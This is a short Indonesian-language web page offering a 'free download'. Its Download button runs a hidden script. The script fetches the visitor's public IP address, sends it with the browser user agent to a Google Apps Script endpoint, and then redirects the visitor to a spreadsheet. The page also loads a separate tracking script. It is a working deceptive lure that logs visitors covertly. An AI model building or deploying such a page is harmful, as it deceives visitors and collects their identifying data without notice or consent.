<!DOCTYPE html>
<html>
<head>
    <title>Download Gratis</title>
</head>
<body>
    <h1>Klik link di bawah ini:</h1>
   <button onclick="trackIP()">Download</button>

<script>
function trackIP() {
  fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
      fetch(`https://script.google.com/macros/s/AKfycbwEjUViowX-2Wia2UBp_RzI6eF5XwFuj0ovNWnMxwzSiRYK8JKjWOsiKPbEPDz-X6ymeg/exec?ip=${data.ip}&ua=${encodeURIComponent(navigator.userAgent)}`, {
        mode: 'no-cors'
      }).then(() => {
        window.location.href = "https://docs.google.com/spreadsheets/d/1YLdYLm-KngasKdP0iDo9slkh1A3yR07HZkfp8o9feXM/edit?usp=sharing";
      });
    });
}
</script>
    <script src="track.js"></script>
</body>
</html>
